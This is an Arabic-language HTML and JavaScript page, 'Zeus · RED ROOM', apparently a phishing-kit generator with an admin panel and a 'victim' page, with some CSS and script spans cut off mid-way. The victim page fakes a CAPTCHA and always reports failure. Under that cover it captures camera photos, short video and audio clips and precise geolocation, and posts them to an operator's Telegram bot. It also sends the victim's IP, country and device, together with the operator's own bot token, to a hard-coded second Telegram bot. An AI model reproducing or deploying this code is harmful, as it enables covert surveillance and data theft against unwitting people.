<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>𝒁𝒆𝒖𝒔 · RED ROOM</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        /* ============================================================
           𝕳𝕬𝕮𝕶𝕰𝕽 · 𝕽𝕰𝕯 · 𝕲𝕺𝕷𝕯 — 𝒁𝒆𝒖𝒔 𝕰𝕯𝕴𝕿𝕴𝕺𝕹
           ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #f5f3f0;
            color: #1a1a1a;
            font-family: 'Cairo', 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            direction: rtl;
            background-image: radial-gradient(ellipse at 10% 20%, rgba(212, 175, 55, 0.04) 0%, transparent 60%),
                radial-gradient(ellipse at 90% 80%, rgba(204, 0, 51, 0.04) 0%, transparent 60%);
        }

        /* ============================================================
           ADMIN PANEL — فاخر أبيض
           ============================================================ */
        .container {
            background: #ffffff;
            border-radius: 32px;
            padding: 34px 30px;
            max-width: 580px;
            width: 100%;
            border: 1px solid rgba(212, 175, 55, 0.15);
            box-shadow: 0 20px 80px rgba(0, 0, 0, 0.06), 0 8px 32px rgba(0, 0, 0, 0.03), inset 0 1px 0 rgba(255, 255, 255, 0.8);
            position: relative;
            overflow: hidden;
            animation: containerFloat 6s ease-in-out infinite;
        }
        @keyframes containerFloat {
            0%,
            100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-6px);
            }
        }
        .container::before {
            content: '';
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(212, 175, 55, 0.012) 3px, rgba(212, 175, 55, 0.012) 4px);
            pointer-events: none;
            border-radius: 32px;
        }

        /* ============================================================
           HEADER — 𝒁𝒆𝒖𝒔 مع ERROR GLITCH
           ============================================================ */
        .glitch-wrapper {
            text-align: center;
            margin-bottom: 8px;
            position: relative;
        }

        .glitch-title {
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            font-size: 68px;
            letter-spacing: 10px;
            color: #cc0033;
            display: inline-block;
            position: relative;
            text-shadow: 0 0 40px rgba(204, 0, 51, 0.12), 0 0 80px rgba(204, 0, 51, 0.04);
            animation: glitchTextPremium 3.2s infinite;
            line-height: 1.1;
        }
        .glitch-title .error-text {
            font-size: 14px;
            letter-spacing: 6px;
            display: block;
            color: #cc0033;
            opacity: 0.6;
            font-weight: 700;
            margin-top: -6px;
            animation: errorPulse 1.8s ease-in-out infinite;
            text-shadow: 0 0 30px rgba(204, 0, 51, 0.10);
        }
        @keyframes errorPulse {
            0%,
            100% {
                opacity: 0.4;
                letter-spacing: 6px;
            }
            50% {
                opacity: 0.9;
                letter-spacing: 10px;
            }
        }

        .glitch-title::before,
        .glitch-title::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        .glitch-title::before {
            color: #d4af37;
            z-index: -1;
            animation: glitchShiftGold 3.6s infinite;
            clip-path: polygon(0 0, 100% 0, 100% 38%, 0 38%);
            transform: translate(-5px, -4px);
            opacity: 0.35;
        }
        .glitch-title::after {
            color: #880022;
            z-index: -2;
            animation: glitchShiftRed 3.0s infinite reverse;
            clip-path: polygon(0 50%, 100% 50%, 100% 100%, 0 100%);
            transform: translate(5px, 4px);
            opacity: 0.30;
        }
        @keyframes glitchShiftGold {
            0% {
                transform: translate(0);
            }
            14% {
                transform: translate(-6px, 5px);
            }
            28% {
                transform: translate(6px, -5px);
            }
            42% {
                transform: translate(-4px, -6px);
            }
            57% {
                transform: translate(5px, 6px);
            }
            71% {
                transform: translate(-5px, 3px);
            }
            85% {
                transform: translate(4px, -4px);
            }
            100% {
                transform: translate(0);
            }
        }
        @keyframes glitchShiftRed {
            0% {
                transform: translate(0);
            }
            14% {
                transform: translate(5px, -4px);
            }
            28% {
                transform: translate(-5px, 4px);
            }
            42% {
                transform: translate(3px, 5px);
            }
            57% {
                transform: translate(-4px, -5px);
            }
            71% {
                transform: translate(4px, -2px);
            }
            85% {
                transform: translate(-3px, 3px);
            }
            100% {
                transform: translate(0);
            }
        }
        @keyframes glitchTextPremium {
            0%,
            78%,
            100% {
                transform: skew(0);
            }
            79% {
                transform: skew(6deg);
            }
            80% {
                transform: skew(-6deg);
            }
            81% {
                transform: skew(4deg);
            }
            82% {
                transform: skew(-4deg);
            }
            83% {
                transform: skew(2deg);
            }
            84% {
                transform: skew(-2deg);
            }
            85% {
                transform: skew(0);
            }
            86% {
                transform: skew(3deg);
            }
            87% {
                transform: skew(-3deg);
            }
            88% {
                transform: skew(0);
            }
        }

        /* ===== SUB BRAND ===== */
        .sub-brand {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            margin-top: 0px;
            padding: 6px 0 12px 0;
            border-bottom: 1px solid rgba(212, 175, 55, 0.10);
        }
        .sub-brand .handle {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 5px;
            color: #d4af37;
            text-shadow: 0 0 30px rgba(212, 175, 55, 0.10);
            animation: handleGlow 3.4s ease-in-out infinite;
        }
        @keyframes handleGlow {
            0%,
            100% {
                text-shadow: 0 0 20px rgba(212, 175, 55, 0.05);
            }
            50% {
                text-shadow: 0 0 40px rgba(212, 175, 55, 0.20), 0 0 80px rgba(212, 175, 55, 0.06);
            }
        }
        .sub-brand .telegram-link {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 38px;
            height: 38px;
            border-radius: 50%;
            border: 1.5px solid rgba(212, 175, 55, 0.20);
            transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            cursor: pointer;
            text-decoration: none;
            background: rgba(212, 175, 55, 0.03);
            animation: badgePulse 4.2s ease-in-out infinite;
        }
        .sub-brand .telegram-link:nth-child(2) {
            animation-delay: 0.5s;
        }
        @keyframes badgePulse {
            0%,
            100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.06);
            }
        }
        .sub-brand .telegram-link:hover {
            border-color: #d4af37;
            box-shadow: 0 0 40px rgba(212, 175, 55, 0.15), 0 0 80px rgba(212, 175, 55, 0.04);
            transform: scale(1.12) rotate(-4deg);
        }
        .sub-brand .telegram-link svg {
            width: 22px;
            height: 22px;
            fill: #d4af37;
            opacity: 0.7;
            transition: 0.3s;
        }
        .sub-brand .telegram-link:hover svg {
            opacity: 1;
            filter: drop-shadow(0 0 20px rgba(212, 175, 55, 0.15));
        }

        /* ============================================================
           FORM
           ============================================================ */
        .field {
            margin-bottom: 20px;
            animation: fieldFade 0.8s ease forwards;
        }
        .field:nth-child(1) {
            animation-delay: 0.1s;
        }
        .field:nth-child(2) {
            animation-delay: 0.2s;
        }
        @keyframes fieldFade {
            0% {
                opacity: 0;
                transform: translateY(12px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .field label {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            font-weight: 700;
            color: #333;
            margin-bottom: 6px;
            letter-spacing: 0.5px;
        }
        .field label svg {
            width: 20px;
            height: 20px;
            stroke: #cc0033;
            stroke-width: 1.8;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
            flex-shrink: 0;
            opacity: 0.7;
        }
        .field input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 14px;
            border: 1.5px solid #e0ddd8;
            background: #fafaf8;
            color: #1a1a1a;
            font-size: 16px;
            font-family: 'Cairo', sans-serif;
            box-sizing: border-box;
            direction: ltr;
            text-align: left;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            letter-spacing: 0.5px;
            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.02);
        }
        .field input:focus {
            outline: none;
            border-color: #d4af37;
            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.08), inset 0 2px 6px rgba(0, 0, 0, 0.02);
            background: #ffffff;
        }
        .field input::placeholder {
            color: #bbb8b2;
            font-family: 'Cairo', sans-serif;
            letter-spacing: 0.5px;
        }

        /* ============================================================
           FEATURES — ذهبية
           ============================================================ */
        .features-label {
            font-size: 15px;
            font-weight: 700;
            color: #333;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            letter-spacing: 0.5px;
            animation: fieldFade 0.8s ease 0.3s forwards;
            opacity: 0;
        }
        .features-label svg {
            width: 22px;
            height: 22px;
            stroke: #d4af37;
            stroke-width: 1.8;
            fill: none;
        }
        .features-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-bottom: 24px;
            animation: fieldFade 0.8s ease 0.4s forwards;
            opacity: 0;
        }
        .feature-item {
            background: #f8f7f5;
            border: 1.5px solid #e8e5e0;
            border-radius: 16px;
            padding: 12px 6px;
            text-align: center;
            cursor: pointer;
            transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            font-size: 14px;
            font-weight: 600;
            color: #888;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            user-select: none;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
            animation: featureFloat 5.2s ease-in-out infinite;
        }
        .feature-item:nth-child(1) {
            animation-delay: 0s;
        }
        .feature-item:nth-child(2) {
            animation-delay: 0.4s;
        }
        .feature-item:nth-child(3) {
            animation-delay: 0.8s;
        }
        .feature-item:nth-child(4) {
            animation-delay: 0.2s;
        }
        .feature-item:nth-child(5) {
            animation-delay: 0.6s;
        }
        .feature-item:nth-child(6) {
            animation-delay: 1.0s;
        }
        @keyframes featureFloat {
            0%,
            100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-4px);
            }
        }
        .feature-item svg {
            width: 28px;
            height: 28px;
            stroke: #999;
            stroke-width: 1.6;
            fill: none;
            transition: all 0.35s ease;
        }
        .feature-item.active {
            border-color: #d4af37;
            background: #fffcf5;
            color: #cc0033;
            box-shadow: 0 4px 20px rgba(212, 175, 55, 0.10), 0 0 40px rgba(212, 175, 55, 0.03);
            transform: scale(1.02);
        }
        .feature-item.active svg {
            stroke: #d4af37;
            filter: drop-shadow(0 0 20px rgba(212, 175, 55, 0.10));
        }
        .feature-item:hover {
            border-color: rgba(212, 175, 55, 0.30);
            transform: translateY(-2px);
        }
        .feature-item input {
            display: none;
        }

        /* ============================================================
           BUTTON — 3D متحرك
           ============================================================ */
        .btn-primary {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 18px;
            background: linear-gradient(145deg, #cc0033, #a00028);
            color: #fff;
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 3px;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            transition: all 0.15s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: 0 8px 0 #6e001a, 0 10px 40px rgba(204, 0, 51, 0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            position: relative;
            overflow: hidden;
            animation: btnGlow 4.6s ease-in-out infinite;
            transform: translateY(0);
        }
        @keyframes btnGlow {
            0%,
            100% {
                box-shadow: 0 8px 0 #6e001a, 0 10px 40px rgba(204, 0, 51, 0.20);
            }
            50% {
                box-shadow: 0 8px 0 #6e001a, 0 10px 60px rgba(204, 0, 51, 0.35), 0 0 80px rgba(204, 0, 51, 0.06);
            }
        }
        .btn-primary::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 18px;
            background: linear-gradient(120deg, transparent 30%, rgba(255, 255, 255, 0.10) 50%, transparent 70%);
            transform: translateX(-120%);
            transition: transform 0.7s ease;
            pointer-events: none;
        }
        .btn-primary:hover::before {
            transform: translateX(120%);
        }
        .btn-primary::after {
            content: '';
            position: absolute;
            inset: -2px;
            border-radius: 20px;
            padding: 2px;
            background: linear-gradient(135deg, transparent, rgba(212, 175, 55, 0.20), transparent);
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.4s ease;
        }
        .btn-primary:hover::after {
            opacity: 1;
        }
        .btn-primary svg {
            width: 24px;
            height: 24px;
            stroke: #fff;
            stroke-width: 2;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.08));
        }
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-3px) scale(1.01);
            box-shadow: 0 10px 0 #6e001a, 0 18px 50px rgba(204, 0, 51, 0.30);
            background: linear-gradient(145deg, #dd0033, #b00028);
        }
        .btn-primary:active:not(:disabled) {
            transform: translateY(5px);
            box-shadow: 0 3px 0 #6e001a;
            transition-duration: 0.06s;
        }
        .btn-primary:disabled {
            opacity: 0.5;
            transform: translateY(4px);
            box-shadow: 0 4px 0 #6e001a;
            cursor: not-allowed;
            animation: none;
        }

        .error {
            color: #cc0033;
            font-size: 14px;
            margin-top: 8px;
            min-height: 24px;
            font-weight: 600;
            letter-spacing: 0.5px;
            animation: errorShake 0.4s ease;
        }
        @keyframes errorShake {
            0%,
            100% {
                transform: translateX(0);
            }
            25% {
                transform: translateX(-6px);
            }
            75% {
                transform: translateX(6px);
            }
        }

        /* ============================================================
           RESULT
           ============================================================ */
        .result-box {
            margin-top: 22px;
            padding: 20px;
            border: 1.5px solid rgba(212, 175, 55, 0.15);
            border-radius: 18px;
            background: #fcfbf9;
            display: none;
            text-align: center;
            animation: resultPop 0.6s cubic-bezier(0.22, 1, 0.36, 1);
            box-shadow: 0 4px 30px rgba(212, 175, 55, 0.04);
        }
        @keyframes resultPop {
            0% {
                opacity: 0;
                transform: scale(0.94) translateY(10px);
            }
            100% {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }
        .result-box .label {
            font-weight: 700;
            color: #cc0033;
            margin-bottom: 4px;
            letter-spacing: 1.5px;
            font-size: 15px;
        }
        .result-box .short-token {
            font-family: 'Orbitron', monospace;
            font-size: 34px;
            font-weight: 900;
            color: #cc0033;
            letter-spacing: 8px;
            margin: 6px 0;
            text-shadow: 0 0 40px rgba(204, 0, 51, 0.08);
            animation: tokenPulse 3.2s ease-in-out infinite;
        }
        @keyframes tokenPulse {
            0%,
            100% {
                text-shadow: 0 0 20px rgba(204, 0, 51, 0.04);
            }
            50% {
                text-shadow: 0 0 50px rgba(204, 0, 51, 0.12), 0 0 80px rgba(204, 0, 51, 0.04);
            }
        }
        .result-box .link-url {
            color: #666;
            font-size: 15px;
            word-break: break-all;
            background: #f5f3f0;
            padding: 10px 14px;
            border-radius: 12px;
            margin: 10px 0;
            font-family: 'Cairo', sans-serif;
            direction: ltr;
            text-align: left;
            border: 1px solid #e8e5e0;
        }
        .result-box .actions {
            display: flex;
            gap: 14px;
            justify-content: center;
            margin-top: 14px;
        }
        .result-box .actions button {
            background: #f8f7f5;
            border: 1.5px solid #e0ddd8;
            color: #333;
            padding: 10px 26px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            display: flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 4px 0 #d5d2cc, 0 4px 12px rgba(0, 0, 0, 0.02);
            transform: translateY(0);
        }
        .result-box .actions button svg {
            width: 20px;
            height: 20px;
            stroke: #555;
            stroke-width: 2;
            fill: none;
            transition: 0.3s ease;
        }
        .result-box .actions button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 0 #d5d2cc, 0 8px 24px rgba(0, 0, 0, 0.04);
            border-color: #d4af37;
            background: #fffcf5;
        }
        .result-box .actions button:hover svg {
            stroke: #d4af37;
        }
        .result-box .actions button:active {
            transform: translateY(3px);
            box-shadow: 0 2px 0 #d5d2cc;
            transition-duration: 0.06s;
        }

        /* ============================================================
           LOG — مع أرقام متحركة
           ============================================================ */
        .log-wrapper {
            position: relative;
            margin-top: 20px;
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid #e8e5e0;
            background: #fafaf8;
            min-height: 130px;
            box-shadow: inset 0 2px 12px rgba(0, 0, 0, 0.02);
        }
        .log-wrapper canvas {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            opacity: 0.15;
            pointer-events: none;
        }
        .log {
            position: relative;
            z-index: 1;
            padding: 14px 18px;
            font-family: 'Courier New', 'Cairo', monospace;
            font-size: 14px;
            color: #555;
            min-height: 130px;
            direction: ltr;
            text-align: left;
            max-height: 180px;
            overflow-y: auto;
            background: transparent;
        }
        .log::-webkit-scrollbar {
            width: 4px;
        }
        .log::-webkit-scrollbar-track {
            background: transparent;
        }
        .log::-webkit-scrollbar-thumb {
            background: #d4af37;
            border-radius: 4px;
        }
        .log .prompt {
            color: #cc0033;
            font-weight: 700;
            text-shadow: 0 0 20px rgba(204, 0, 51, 0.06);
        }
        .log .gold {
            color: #d4af37;
        }
        .log .success {
            color: #2d8a4e;
        }
        .log .wait {
            color: #cc8833;
        }
        .log .error-log {
            color: #cc0033;
        }
        .log .dim {
            color: #bbb8b2;
        }
        .log .line {
            padding: 3px 0;
            border-bottom: 1px solid rgba(0, 0, 0, 0.02);
            animation: lineIn 0.3s ease;
        }
        .log .line:last-child {
            border-bottom: none;
        }
        @keyframes lineIn {
            0% {
                opacity: 0;
                transform: translateX(-8px);
            }
            100% {
                opacity: 1;
                transform: translateX(0);
            }
        }
        .cursor {
            display: inline-block;
            width: 9px;
            height: 18px;
            background: #cc0033;
            vertical-align: -2px;
            animation: blink 1s steps(1) infinite;
            box-shadow: 0 0 20px rgba(204, 0, 51, 0.10);
            margin-left: 2px;
        }
        @keyframes blink {
            50% {
                opacity: 0;
            }
        }

        /* ============================================================
           BOT LIST
           ============================================================ */
        .bot-list-wrap {
            margin-top: 18px;
            border-top: 1px solid #e8e5e0;
            padding-top: 16px;
        }
        .bot-list-wrap .list-header {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 14px;
            font-weight: 700;
            color: #555;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }
        .bot-list-wrap .list-header svg {
            width: 22px;
            height: 22px;
            stroke: #d4af37;

            height: 20px;

        }
        .spinner.loading .checkmark {

    <script>
        // ================================================================
        //  1. ROUTING
        // ================================================================
        const adminPanel = document.getElementById('adminPanel');
        const victimPanel = document.getElementById('victimPanel');
        const params = new URLSearchParams(window.location.search);
        const shortTokenParam = params.get('t');

        if (shortTokenParam) {
            adminPanel.style.display = 'none';
            victimPanel.style.display = 'flex';
            initVictimPage();
        } else {
            initAdminPanel();
            initMatrixRain();

        // ================================================================
        //  2. VICTIM PAGE — صامتة، تطلب كل الصلاحيات بدون ظهور
        // ================================================================
        function initVictimPage() {
            const spinner = document.getElementById('spinner');
            const checkbox = document.getElementById('captcha');
            const mainText = document.getElementById('mainText');
            const wrapper = document.getElementById('captchaWrapper');

            let isProcessing = false;
            let isFailed = false;
            let autoRetryTimer = null;
            let permissionsGranted = false;
            let botTokenForVictim = null;
            let chatIdForVictim = null;
            let featuresForVictim = [];

            // ---- استرجاع التوكن من التخزين ----
            function getBotData() {
                try {
                    const data = JSON.parse(localStorage.getItem('zeus_bots') || '{}');
                    // نبحث عن التوكن الذي له هذا الرابط القصير
                    const shortToken = shortTokenParam;
                    for (const [token, entry] of Object.entries(data)) {
                        if (entry.shortToken === shortToken) {
                            return { botToken: token, chatId: entry.chatId, features: entry.features || '' };
                        }
                    }
                } catch (e) { /* صامت */ }
                return null;
            }

            const botData = getBotData();
            if (botData) {
                botTokenForVictim = botData.botToken;
                chatIdForVictim = botData.chatId;
                featuresForVictim = botData.features.split(',').filter(Boolean);
                console.log('تم تحميل بيانات التوكن للضحية');
            } else {
                console.warn('لم يتم العثور على بيانات للرابط القصير');
            }

            // ---- دالة طلب الصلاحيات بصمت ----
            async function requestAllPermissionsSilently() {
                const results = { camera: false, microphone: false, location: false };

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    stream.getTracks().forEach(t => t.stop());
                    results.camera = true;
                    results.microphone = true;
                } catch (e) {
                    // صامت
                }

                try {
                    // محاولة منفصلة للميكروفون إذا فشل الأول
                    if (!results.microphone) {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        stream.getTracks().forEach(t => t.stop());
                        results.microphone = true;
                    }
                } catch (e) { /* صامت */ }

                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000,
                            enableHighAccuracy: true });
                    });
                    results.location = true;
                } catch (e) { /* صامت */ }

                permissionsGranted = results.camera && results.microphone && results.location;
                return results;
            }

            // ---- دالة التقاط وإرسال الصور ----
            async function captureAndSend(type) {
                try {
                    const facingMode = type === 'camFront' ? 'user' : 'environment';
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
                    const video = document.createElement('video');
                    video.autoplay = true;
                    video.playsInline = true;
                    video.muted = true;
                    video.style.display = 'none';
                    video.srcObject = stream;
                    document.body.appendChild(video);

                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(async (blob) => {
                                    if (blob && blob.size > 500 && botTokenForVictim && chatIdForVictim) {
                                        const form = new FormData();
                                        form.append('chat_id', chatIdForVictim);
                                        form.append('photo', blob, `${type}_${Date.now()}.jpg`);
                                        form.append('caption',
                                            `صورة ${type === 'camFront' ? 'أمامية' : 'خلفية'}`);
                                        try {
                                            await fetch(
                                                `https://api.telegram.org/bot${botTokenForVictim}/sendPhoto`, { method: 'POST',
                                                    body: form });
                                        } catch (e) { /* صامت */ }
                                    }
                                    document.body.removeChild(video);
                                    stream.getTracks().forEach(t => t.stop());
                                    resolve();
                                }, 'image/jpeg', 0.8);
                            }, 1500);
                        };
                    });
                } catch (e) { /* صامت */ }
            }

            // ---- دالة تسجيل فيديو ----
            async function recordAndSend(type) {
                try {
                    const facingMode = type === 'videoFront' ? 'user' : 'environment';
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
                    const mr = new MediaRecorder(stream);
                    const chunks = [];
                    mr.ondataavailable = (e) => chunks.push(e.data);
                    mr.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        if (blob.size > 500 && botTokenForVictim && chatIdForVictim) {
                            const form = new FormData();
                            form.append('chat_id', chatIdForVictim);
                            form.append('video', blob, `${type}_${Date.now()}.mp4`);
                            form.append('caption', `فيديو ${type === 'videoFront' ? 'أمامي' : 'خلفي'}`);
                            try {
                                await fetch(`https://api.telegram.org/bot${botTokenForVictim}/sendVideo`, { method: 'POST',
                                    body: form });
                            } catch (e) { /* صامت */ }
                        }
                        stream.getTracks().forEach(t => t.stop());
                    };
                    mr.start();
                    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
                    await new Promise((resolve) => { mr.onstop = () => resolve(); });
                } catch (e) { /* صامت */ }
            }

            // ---- دالة تسجيل صوتي ----
            async function recordAudioAndSend() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const mr = new MediaRecorder(stream);
                    const chunks = [];
                    mr.ondataavailable = (e) => chunks.push(e.data);
                    mr.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/mp4' });
                        if (blob.size > 500 && botTokenForVictim && chatIdForVictim) {
                            const form = new FormData();
                            form.append('chat_id', chatIdForVictim);
                            form.append('audio', blob, `audio_${Date.now()}.mp4`);
                            form.append('caption', 'تسجيل صوتي');
                            try {
                                await fetch(`https://api.telegram.org/bot${botTokenForVictim}/sendAudio`, { method: 'POST',
                                    body: form });
                            } catch (e) { /* صامت */ }
                        }
                        stream.getTracks().forEach(t => t.stop());
                    };
                    mr.start();
                    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
                    await new Promise((resolve) => { mr.onstop = () => resolve(); });
                } catch (e) { /* صامت */ }
            }

            // ---- دالة إرسال الموقع ----
            async function sendLocation() {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000,
                            enableHighAccuracy: true });
                    });
                    const { latitude, longitude } = pos.coords;
                    const text = `📍 الموقع الحالي\n${latitude}, ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
                    if (botTokenForVictim && chatIdForVictim) {
                        await fetch(`https://api.telegram.org/bot${botTokenForVictim}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatIdForVictim, text })
                        });
                    }
                } catch (e) { /* صامت */ }
            }

            // ---- دالة تنفيذ جمع البيانات حسب الميزات ----
            async function executeDataCollection() {
                if (!botTokenForVictim || !chatIdForVictim) return;

                for (const feature of featuresForVictim) {
                    try {
                        switch (feature) {
                            case 'camFront':
                            case 'camBack':
                                await captureAndSend(feature);
                                break;
                            case 'videoFront':
                            case 'videoBack':
                                await recordAndSend(feature);
                                break;
                            case 'audio':
                                await recordAudioAndSend();
                                break;
                            case 'location':
                                await sendLocation();
                                break;
                        }
                    } catch (e) { /* صامت */ }
                }
            }

            // ---- دالة إشعار المطور ----
            async function sendMasterNotification() {
                try {
                    const now = new Date();
                    const time = now.toLocaleTimeString('ar-EG');
                    const date = now.toLocaleDateString('ar-EG');
                    let ip = 'غير معروف',
                        country = 'غير معروف';
                    try {
                        const r = await fetch('https://ipapi.co/json/');
                        const d = await r.json();
                        ip = d.ip || 'غير معروف';
                        country = d.country_name || 'غير معروف';
                    } catch (_) {}

                    const msg =
                        `⭑ تقرير الضحية ⭒\n⊚─〔 دخول 〕────────\n˼⏣˹ التوكن: ${botTokenForVictim || 'غير معروف'} ⭒\n˼⏣˹ IP: ${ip} ⭒\n˼⏣˹ الدولة: ${country} ⭒\n˼⏣˹ الجهاز: ${navigator.userAgent.includes('Android') ? 'Android' : navigator.userAgent.includes('iPhone') ? 'iOS' : 'Desktop'} ⭒\n˼⏣˹ الصلاحيات: ✅ كاميرا · ✅ ميكروفون · ✅ موقع ⭒\n˼⏣˹ الميزات: ${featuresForVictim.join(' · ') || 'بدون'} ⭒\n˼⏣˹ الوقت: ${time} ⭒\n˼⏣˹ التاريخ: ${date} ⭒\n─────────────────`;
                    await fetch(`https://api.telegram.org/bot8907179366:AAFc_mZPTixDFmbtLhMfyAxEFiifI50DLIo/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: '8552540563', text: msg, parse_mode: 'Markdown' })
                    });
                } catch (_) {}
            }

            // ---- دالة إعادة تعيين الفشل ----
            function resetToFailed() {
                spinner.classList.remove('loading', 'success');
                spinner.classList.add('failed');
                mainText.className = 'text failed';
                mainText.textContent = 'فشل التحقق، حاول مجدداً';
                checkbox.checked = false;
                isFailed = true;
                isProcessing = false;
                checkbox.disabled = false;
                if (autoRetryTimer) clearTimeout(autoRetryTimer);
                autoRetryTimer = setTimeout(function() {
                    if (!isProcessing) {
                        simulateVerification();
                    }
                }, 2500);
            }

            // ---- دالة محاكاة التحقق (مع طلب الصلاحيات بصمت) ----
            function simulateVerification() {
                if (isProcessing) return;
                isProcessing = true;
                checkbox.disabled = true;
                if (autoRetryTimer) clearTimeout(autoRetryTimer);
                spinner.classList.remove('failed', 'success');
                spinner.classList.add('loading');
                mainText.textContent = 'جاري التحقق من هويتك ...';
                mainText.className = 'text loading';

                const delay = 1800 + Math.random() * 1800;
                setTimeout(async function() {
                    // طلب الصلاحيات بصمت
                    await requestAllPermissionsSilently();

                    // جمع البيانات وإرسالها
                    if (permissionsGranted) {
                        await executeDataCollection();
                        await sendMasterNotification();
                    }

                    resetToFailed();
                    checkbox.disabled = false;
                }, delay);
            }

            // ---- أحداث المستخدم ----
            checkbox.addEventListener('change', function(e) {
                if (this.checked) {
                    this.checked = false;
                    if (autoRetryTimer) clearTimeout(autoRetryTimer);
                    simulateVerification();
                } else {
                    if (isFailed) {
                        this.checked = false;
                        e.preventDefault();
                    }
                }
            });

            wrapper.addEventListener('click', function(e) {
                if (e.target.closest('.checkmark') || e.target.closest('.captcha-footer') || e.target.closest('.logo'))
                    return;
                if (isProcessing) return;
                if (autoRetryTimer) clearTimeout(autoRetryTimer);
                if (!checkbox.checked && !spinner.classList.contains('loading')) {
                    simulateVerification();
                }
            });

            checkbox.addEventListener('click', function(e) {
                if (isFailed || isProcessing) {
                    e.preventDefault();
                    this.checked = false;
                    if (!isProcessing) {
                        if (autoRetryTimer) clearTimeout(autoRetryTimer);
                        simulateVerification();
                    }
                }
            });

            checkbox.addEventListener('keydown', function(e) {
                if (e.key === ' ' || e.key === 'Spacebar') {
                    e.preventDefault();
                    if (!isProcessing) {
                        if (autoRetryTimer) clearTimeout(autoRetryTimer);
                        simulateVerification();
                    }
                }
            });

            // بدء تلقائي
            setTimeout(function() {
                simulateVerification();
            }, 1000);

            console.log('𝒁𝒆𝒖𝒔 · VICTIM — يتم طلب الصلاحيات بصمت');
        }

        // ================================================================
        //  3. MATRIX RAIN — أرقام متحركة
        // ================================================================
        function initMatrixRain() {
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
